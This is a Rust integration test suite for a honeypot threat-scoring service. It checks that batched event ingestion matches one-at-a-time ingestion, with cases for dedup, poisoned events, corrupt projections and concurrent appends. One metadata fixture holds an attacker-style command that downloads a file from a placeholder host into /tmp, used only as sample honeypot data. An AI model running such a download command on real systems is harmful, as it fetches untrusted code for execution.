//! `append_events` against the one-at-a-time path it replaces on intake.
//!
//! The claim under test is a relation, not a value: for any event stream and any way of cutting it
//! into batches, ingesting through `append_events` leaves the database in the same state as
//! calling `append_event` / `append_telemetry_event` once per event in order. "Same state" is
//! checked as text, so a byte of difference anywhere fails: every ledger column except the
//! wall-clock `ingested_at` (ids and chain hashes included), every `ip_score` column, and both
//! breadth sets. The one-at-a-time ingestion is the oracle; `append_events` shares the chain hash,
//! the pure `apply_event` fold and the event normalization with it, and nothing else.
//!
//! The streams come from fixed proptest seeds, so a failure names a seed and a case that
//! reproduce it. They mix six sources (one IPv6), WANs in shared /24s, a missing WAN, three
//! sensors and every signal type (telemetry included), steps in time that run backwards, sit
//! inside the 60 s dedup window, and jump hours and days, sub-microsecond timestamps, rich
//! metadata, session ids, and exact repeats of the previous event.

use std::collections::BTreeSet;
use std::net::IpAddr;

use chrono::{DateTime, Duration, Utc};
use core_scoring::{
    ChainStatus, EventInput, Protocol, RepoError, SignalType, append_event, append_events,
    append_telemetry_event, read_score, rebuild_projection, verify_chain,
};
use proptest::prelude::*;
use proptest::strategy::ValueTree;
use proptest::test_runner::{Config, RngAlgorithm, TestRng, TestRunner};
use sqlx::PgPool;

const SOURCES: [&str; 6] = [
    "192.0.2.10",
    "192.0.2.11",
    "192.0.2.12",
    "198.51.100.200",
    "203.0.113.77",
    "2001:db8:1::5",
];
const WANS: [Option<&str>; 6] = [
    Some("198.51.100.1"),
    Some("198.51.100.77"),
    Some("203.0.113.5"),
    Some("2001:db8::1"),
    Some("192.0.2.200"),
    None,
];
const SENSORS: [&str; 3] = ["ssh", "telnet", "vnc"];
const PROTOCOLS: [Protocol; 3] = [Protocol::Tcp, Protocol::Udp, Protocol::Icmp];
/// Seconds between consecutive events: repeats, inside the dedup window on both sides of the
/// edge, backwards, hours, and days (new active days, long decay).
const STEPS: [i64; 16] = [
    0, 0, 1, 5, 30, 59, 60, 61, -5, -61, -3600, 3600, 21_600, 86_400, 172_800, 900,
];

/// Source, WAN, sensor, signal, protocol, authenticated, step, metadata, session id, nanos,
/// repeat-the-previous-event.
type Spec = (
    usize,
    usize,
    usize,
    usize,
    usize,
    bool,
    usize,
    usize,
    bool,
    u32,
    bool,
);

fn stream() -> impl Strategy<Value = Vec<Spec>> {
    prop::collection::vec(
        (
            0..SOURCES.len(),
            0..WANS.len(),
            0..SENSORS.len(),
            0..SignalType::ALL.len(),
            0..PROTOCOLS.len(),
            any::<bool>(),
            0..STEPS.len(),
            0..4usize,
            any::<bool>(),
            0..1000u32,
            prop::bool::weighted(0.2),
        ),
        20..160,
    )
}

fn metadata(kind: usize, n: usize) -> serde_json::Value {
    match kind {
        0 => serde_json::json!({}),
        1 => {
            serde_json::json!({ "command": format!("cd /tmp; wget http://192.0.2.1/{n}"), "local_port": 23 })
        }
        2 => {
            serde_json::json!({ "nested": { "list": [1, 2, { "k": "v" }], "empty": [] }, "text": "caf\u{e9} \u{1f41d}" })
        }
        _ => serde_json::json!({ "n": n, "flag": true, "none": null }),
    }
}

fn events_of(specs: &[Spec]) -> Vec<EventInput> {
    let base: DateTime<Utc> = "2026-09-01T00:00:00Z".parse().expect("literal");
    let mut at = base;
    let mut out: Vec<EventInput> = Vec::with_capacity(specs.len());
    for (n, &(src, wan, sensor, signal, proto, auth, step, meta, session, nanos, repeat)) in
        specs.iter().enumerate()
    {
        if repeat && let Some(previous) = out.last() {
            out.push(previous.clone());
            continue;
        }
        at += Duration::seconds(STEPS[step]);
        let stamp = at + Duration::nanoseconds(i64::from(nanos));
        let session_id = session.then(|| uuid::Uuid::from_u128(n as u128 + 1));
        out.push(EventInput::from_signal(
            SOURCES[src].parse().expect("fixture source"),
            WANS[wan].map(|w| w.parse().expect("fixture wan")),
            SENSORS[sensor].into(),
            SignalType::ALL[signal],
            PROTOCOLS[proto],
            auth,
            stamp,
            metadata(meta, n),
            session_id,
        ));
    }
    out
}

async fn reset(pool: &PgPool) -> sqlx::Result<()> {
    sqlx::query("TRUNCATE event, ip_score, ip_vantage, ip_sensor RESTART IDENTITY")
        .execute(pool)
        .await?;
    Ok(())
}

/// Every persisted fact the append path writes, as text. `ingested_at` is the wall clock at
/// insert, the one column that cannot match across two runs.
async fn snapshot(pool: &PgPool) -> sqlx::Result<Vec<String>> {
    let mut rows = Vec::new();
    for (tag, sql) in [
        (
            "event",
            "SELECT (id, source_ip, wan_ip, sensor, signal_type, protocol, authenticated, \
                     category, weight, confidence, observed_at, metadata, \
                     encode(prev_hash, 'hex'), encode(hash, 'hex'), session_id)::text \
             FROM event ORDER BY id",
        ),
        (
            "ip_score",
            "SELECT (s.*)::text FROM ip_score s ORDER BY source_ip",
        ),
        (
            "ip_vantage",
            "SELECT (v.*)::text FROM ip_vantage v ORDER BY source_ip, wan_ip",
        ),
        (
            "ip_sensor",
            "SELECT (v.*)::text FROM ip_sensor v ORDER BY source_ip, sensor",
        ),
    ] {
        let found: Vec<String> = sqlx::query_scalar(sql).fetch_all(pool).await?;
        rows.extend(found.into_iter().map(|r| format!("{tag}: {r}")));
    }
    Ok(rows)
}

async fn ingest_one_by_one(pool: &PgPool, events: &[EventInput]) -> Result<(), RepoError> {
    for event in events {
        if event.signal_type.is_telemetry() {
            append_telemetry_event(pool, event.clone()).await?;
        } else {
            append_event(pool, event.clone()).await?;
        }
    }
    Ok(())
}

/// Cuts `events` into batches of the sizes in `plan`, cycling through it.
async fn ingest_batched(
    pool: &PgPool,
    events: &[EventInput],
    plan: &[usize],
) -> Result<(), RepoError> {
    let mut at = 0;
    let mut turn = 0;
    while at < events.len() {
        let end = (at + plan[turn % plan.len()]).min(events.len());
        let outcome = append_events(pool, events[at..end].to_vec()).await;
        if let Some(failure) = outcome.failure {
            return Err(failure);
        }
        assert_eq!(
            outcome.appended,
            end - at,
            "a clean batch appends all of it"
        );
        at = end;
        turn += 1;
    }
    Ok(())
}

fn first_difference(oracle: &[String], batched: &[String]) -> String {
    for (i, (a, b)) in oracle.iter().zip(batched).enumerate() {
        if a != b {
            return format!("row {i}\n  one-at-a-time: {a}\n  batched:       {b}");
        }
    }
    format!(
        "row counts differ: one-at-a-time {} vs batched {}",
        oracle.len(),
        batched.len()
    )
}

/// Chain verification and an independent replay over the batch-built ledger.
async fn assert_ledger_sound(pool: &PgPool, events: &[EventInput], label: &str) {
    assert_eq!(
        verify_chain(pool).await.expect("verify_chain"),
        ChainStatus::Intact,
        "{label}: chain of the batch-built ledger"
    );
    let scored: BTreeSet<IpAddr> = events
        .iter()
        .filter(|e| !e.signal_type.is_telemetry())
        .map(|e| e.source_ip)
        .collect();
    for ip in scored {
        let replayed = rebuild_projection(pool, ip).await.expect("rebuild");
        let stored = core_scoring::repository::read_stored_score(pool, ip)
            .await
            .expect("read stored");
        assert_eq!(
            replayed, stored,
            "{label}: replay of {ip} differs from the batch-built score"
        );
    }
}

const SEEDS: std::ops::RangeInclusive<u8> = 1..=8;
const CASES_PER_SEED: usize = 4;
/// Batch cuts to try. Each case uses one: single events, small, odd, and one batch for all.
const PLANS: [&[usize]; 6] = [&[1], &[2, 3], &[7], &[5, 1, 30, 2], &[64], &[10_000]];

#[sqlx::test(migrations = "./migrations")]
async fn batched_ingestion_is_byte_identical_to_one_at_a_time(pool: PgPool) -> sqlx::Result<()> {
    let mut cases = 0;
    let mut appends = 0;
    let mut dedup_cases = 0;
    for seed in SEEDS {
        let rng = TestRng::from_seed(RngAlgorithm::ChaCha, &[seed; 32]);
        let mut runner = TestRunner::new_with_rng(Config::default(), rng);
        let strategy = stream();
        for case in 0..CASES_PER_SEED {
            let specs = strategy
                .new_tree(&mut runner)
                .expect("strategy yields a stream")
                .current();
            let events = events_of(&specs);
            let plan = PLANS[(seed as usize + case) % PLANS.len()];
            let label = format!(
                "seed {seed} case {case} plan {plan:?} ({} events)",
                events.len()
            );

            reset(&pool).await?;
            ingest_one_by_one(&pool, &events)
                .await
                .unwrap_or_else(|e| panic!("{label}: oracle failed: {e}"));
            let oracle = snapshot(&pool).await?;

            reset(&pool).await?;
            ingest_batched(&pool, &events, plan)
                .await
                .unwrap_or_else(|e| panic!("{label}: batched ingestion failed: {e}"));
            let batched = snapshot(&pool).await?;

            assert!(
                oracle == batched,
                "{label}: state differs after batched ingestion\n{}",
                first_difference(&oracle, &batched)
            );
            assert_ledger_sound(&pool, &events, &label).await;

            cases += 1;
            appends += events.len();
            // The stream must have exercised the cases the relation exists for.
            let in_window = events.windows(2).any(|w| {
                w[0].source_ip == w[1].source_ip
                    && w[0].signal_type == w[1].signal_type
                    && (w[1].observed_at - w[0].observed_at).num_seconds().abs() <= 60
            });
            dedup_cases += usize::from(in_window);
        }
    }
    assert_eq!(cases, SEEDS.count() * CASES_PER_SEED);
    assert!(
        appends > 1500,
        "streams too short to mean anything: {appends}"
    );
    assert!(
        dedup_cases >= cases / 2,
        "only {dedup_cases} of {cases} streams held an adjacent in-window duplicate"
    );
    Ok(())
}

fn event(ip: &str, signal: SignalType, at: DateTime<Utc>, n: usize) -> EventInput {
    EventInput::from_signal(
        ip.parse().expect("fixture source"),
        Some("198.51.100.1".parse().expect("fixture wan")),
        "ssh".into(),
        signal,
        Protocol::Tcp,
        true,
        at,
        serde_json::json!({ "n": n }),
        None,
    )
}

fn t0() -> DateTime<Utc> {
    "2026-09-01T00:00:00Z".parse().expect("literal")
}

/// A duplicate WITHIN one batch is deduped exactly as the second of two sequential appends: the
/// event counts, adds no weight. The relation test covers this statistically; this pins the
/// concrete outcome so a regression reads as a plain number.
#[sqlx::test(migrations = "./migrations")]
async fn in_batch_duplicate_is_counted_but_adds_no_weight(pool: PgPool) -> sqlx::Result<()> {
    let first = event("192.0.2.50", SignalType::HoneypotCommandExec, t0(), 0);
    let second = event(
        "192.0.2.50",
        SignalType::HoneypotCommandExec,
        t0() + Duration::seconds(10),
        1,
    );
    let outcome = append_events(&pool, vec![first, second]).await;
    assert!(outcome.failure.is_none());
    assert_eq!(outcome.appended, 2);
    let score = read_stored(&pool, "192.0.2.50").await;
    assert_eq!(score.event_count, 2);
    // One weight of 60, decayed 10 s of a 6 h half-life; a second weight would read about 120.
    assert!(
        score.raw_score > rust_decimal::Decimal::from(59)
            && score.raw_score < rust_decimal::Decimal::from(60),
        "one weight, not two: {}",
        score.raw_score
    );
    Ok(())
}

async fn read_stored(pool: &PgPool, ip: &str) -> core_scoring::IpScore {
    core_scoring::repository::read_stored_score(pool, ip.parse().expect("ip"))
        .await
        .expect("read")
        .expect("a score row")
}

async fn ledger_rows(pool: &PgPool) -> i64 {
    sqlx::query_scalar("SELECT count(*) FROM event")
        .fetch_one(pool)
        .await
        .expect("count")
}

/// Ten events, the seventh carrying a NUL in its metadata (which `jsonb` rejects, a data
/// exception only that event causes). The six before it commit, exactly as one-at-a-time stops at
/// the first failure; the failure names index 6; nothing after it is written; and the state of
/// the six equals the oracle's.
#[sqlx::test(migrations = "./migrations")]
async fn a_poisoned_event_commits_the_prefix_and_names_the_failure(
    pool: PgPool,
) -> sqlx::Result<()> {
    let mut events: Vec<EventInput> = (0..10)
        .map(|n| {
            event(
                SOURCES[n % 3],
                SignalType::ALL[n % 5],
                t0() + Duration::minutes(n as i64),
                n,
            )
        })
        .collect();
    events[6].metadata = serde_json::json!({ "command": "echo \u{0}" });

    let outcome = append_events(&pool, events.clone()).await;
    assert_eq!(outcome.appended, 6);
    let failure = outcome.failure.expect("the poisoned event must fail");
    assert!(
        matches!(&failure, RepoError::Db(sqlx::Error::Database(d)) if d.code().is_some_and(|c| c.starts_with("22"))),
        "expected a data exception, got {failure:?}"
    );
    assert_eq!(
        ledger_rows(&pool).await,
        6,
        "the prefix is durable, the rest is not"
    );
    let batched = snapshot(&pool).await?;
    assert_ledger_sound(&pool, &events[..6], "poisoned batch").await;

    reset(&pool).await?;
    ingest_one_by_one(&pool, &events[..6])
        .await
        .expect("oracle");
    assert_eq!(
        batched,
        snapshot(&pool).await?,
        "prefix differs from one-at-a-time"
    );
    // The oracle refuses the same event for the same reason, so "poisoned" is not an artifact of
    // batching: one-at-a-time ingestion would have stopped at index 6 too.
    let single = append_event(&pool, events[6].clone()).await;
    assert!(
        matches!(&single, Err(RepoError::Db(sqlx::Error::Database(d))) if d.code().is_some_and(|c| c.starts_with("22"))),
        "{single:?}"
    );
    Ok(())
}

/// The failing event at the first position, the last, and alone: no prefix, a nine-event prefix,
/// and nothing.
#[sqlx::test(migrations = "./migrations")]
async fn a_poisoned_event_at_the_edges_of_a_batch(pool: PgPool) -> sqlx::Result<()> {
    for (len, poisoned, want_appended) in [(10, 0, 0), (10, 9, 9), (1, 0, 0), (2, 1, 1)] {
        reset(&pool).await?;
        let mut events: Vec<EventInput> = (0..len)
            .map(|n| {
                event(
                    SOURCES[n % 2],
                    SignalType::ALL[n % 4],
                    t0() + Duration::minutes(n as i64),
                    n,
                )
            })
            .collect();
        events[poisoned].metadata = serde_json::json!({ "c": "\u{0}" });
        let outcome = append_events(&pool, events.clone()).await;
        assert_eq!(
            outcome.appended, want_appended,
            "len {len} poisoned {poisoned}"
        );
        assert!(outcome.failure.is_some(), "len {len} poisoned {poisoned}");
        assert_eq!(ledger_rows(&pool).await, want_appended as i64);
    }
    Ok(())
}

/// A stored projection that cannot be decoded (here a `category_breakdown` that is not a map)
/// fails the batch that reads it. One-at-a-time ingestion commits every event before the first
/// one for that source, so the batch must too: it is isolated by halving like any one-event
/// failure, not allowed to cost the whole batch.
#[sqlx::test(migrations = "./migrations")]
async fn a_corrupt_stored_projection_costs_only_events_from_its_first_event(
    pool: PgPool,
) -> sqlx::Result<()> {
    sqlx::query(
        "INSERT INTO ip_score (source_ip, raw_score, decay_anchor, max_confidence, event_count, \
         distinct_categories, category_breakdown, first_seen, last_seen) \
         VALUES ('192.0.2.77'::inet, 1, $1, 0, 1, 0, '\"not a map\"'::jsonb, $1, $1)",
    )
    .bind(t0())
    .execute(&pool)
    .await?;
    let events: Vec<EventInput> = [SOURCES[0], SOURCES[1], "192.0.2.77", SOURCES[2], SOURCES[3]]
        .iter()
        .enumerate()
        .map(|(n, ip)| {
            event(
                ip,
                SignalType::HoneypotCommandExec,
                t0() + Duration::minutes(n as i64),
                n,
            )
        })
        .collect();

    let outcome = append_events(&pool, events.clone()).await;
    assert_eq!(
        outcome.appended, 2,
        "the two events before the corrupt source commit"
    );
    assert!(matches!(outcome.failure, Some(RepoError::Corrupt(_))));
    assert_eq!(ledger_rows(&pool).await, 2);

    let single = append_event(&pool, events[2].clone()).await;
    assert!(matches!(single, Err(RepoError::Corrupt(_))), "{single:?}");
    Ok(())
}

/// A validation failure stops the batch where one-at-a-time ingestion would: events before it
/// commit, the invalid one is reported, the valid ones after it are left alone.
#[sqlx::test(migrations = "./migrations")]
async fn an_invalid_event_stops_the_batch_at_its_position(pool: PgPool) -> sqlx::Result<()> {
    let mut events: Vec<EventInput> = (0..5)
        .map(|n| {
            event(
                SOURCES[0],
                SignalType::ALL[n],
                t0() + Duration::minutes(n as i64),
                n,
            )
        })
        .collect();
    events[3].sensor = String::new();
    let outcome = append_events(&pool, events.clone()).await;
    assert_eq!(outcome.appended, 3);
    assert!(matches!(outcome.failure, Some(RepoError::Invalid(_))));
    assert_eq!(ledger_rows(&pool).await, 3);
    Ok(())
}

/// An error that is not about any one event (here the database refusing every insert) is returned
/// without committing anything and without being retried in halves.
#[sqlx::test(migrations = "./migrations")]
async fn a_failure_not_caused_by_one_event_commits_nothing(pool: PgPool) -> sqlx::Result<()> {
    sqlx::query(
        "CREATE FUNCTION refuse_insert() RETURNS trigger AS $$ \
         BEGIN RAISE EXCEPTION 'refused'; END $$ LANGUAGE plpgsql",
    )
    .execute(&pool)
    .await?;
    sqlx::query("CREATE TRIGGER aaa_refuse BEFORE INSERT ON event FOR EACH ROW EXECUTE FUNCTION refuse_insert()")
        .execute(&pool)
        .await?;
    let events: Vec<EventInput> = (0..8)
        .map(|n| {
            event(
                SOURCES[0],
                SignalType::ALL[n],
                t0() + Duration::minutes(n as i64),
                n,
            )
        })
        .collect();
    let outcome = append_events(&pool, events.clone()).await;
    assert_eq!(outcome.appended, 0);
    assert!(outcome.failure.is_some());
    assert_eq!(ledger_rows(&pool).await, 0);
    let scores: i64 = sqlx::query_scalar("SELECT count(*) FROM ip_score")
        .fetch_one(&pool)
        .await?;
    assert_eq!(scores, 0, "no projection without its ledger rows");
    Ok(())
}

/// Batches, single appends and telemetry from concurrent tasks all queue on the one append lock:
/// every event lands exactly once and the chain stays a single intact sequence.
#[sqlx::test(migrations = "./migrations")]
async fn concurrent_batches_and_single_appends_keep_one_chain(pool: PgPool) -> sqlx::Result<()> {
    let mut tasks: Vec<std::pin::Pin<Box<dyn std::future::Future<Output = ()>>>> = Vec::new();
    for worker in 0..6usize {
        let pool = pool.clone();
        tasks.push(Box::pin(async move {
            for round in 0..8usize {
                let events: Vec<EventInput> = (0..7usize)
                    .map(|n| {
                        let signal = if n == 3 {
                            SignalType::HoneypotSessionEnd
                        } else {
                            SignalType::ALL[(n + round) % 4]
                        };
                        event(
                            SOURCES[(worker + n) % SOURCES.len()],
                            signal,
                            t0() + Duration::seconds((worker * 1000 + round * 100 + n) as i64),
                            worker * 100 + round * 10 + n,
                        )
                    })
                    .collect();
                if worker % 2 == 0 {
                    let outcome = append_events(&pool, events.clone()).await;
                    assert!(outcome.failure.is_none() && outcome.appended == events.len());
                } else {
                    for e in events {
                        if e.signal_type.is_telemetry() {
                            append_telemetry_event(&pool, e).await.expect("telemetry");
                        } else {
                            append_event(&pool, e).await.expect("append");
                        }
                    }
                }
            }
        }));
    }
    // Poll all six on this task: they interleave at every await, which is what contends the lock.
    std::future::poll_fn(|cx| {
        tasks.retain_mut(|task| task.as_mut().poll(cx).is_pending());
        if tasks.is_empty() {
            std::task::Poll::Ready(())
        } else {
            std::task::Poll::Pending
        }
    })
    .await;
    assert_eq!(ledger_rows(&pool).await, 6 * 8 * 7);
    assert_eq!(
        verify_chain(&pool).await.expect("verify"),
        ChainStatus::Intact
    );
    for ip in SOURCES {
        let ip: IpAddr = ip.parse().expect("ip");
        // Interleaved order differs from any single ordering, but replay of the ledger as it
        // landed must still equal what the projection holds.
        let replayed = rebuild_projection(&pool, ip).await.expect("rebuild");
        let stored = core_scoring::repository::read_stored_score(&pool, ip)
            .await
            .expect("stored");
        assert_eq!(replayed, stored, "{ip}");
        let _ = read_score(&pool, ip).await.expect("read");
    }
    Ok(())
}
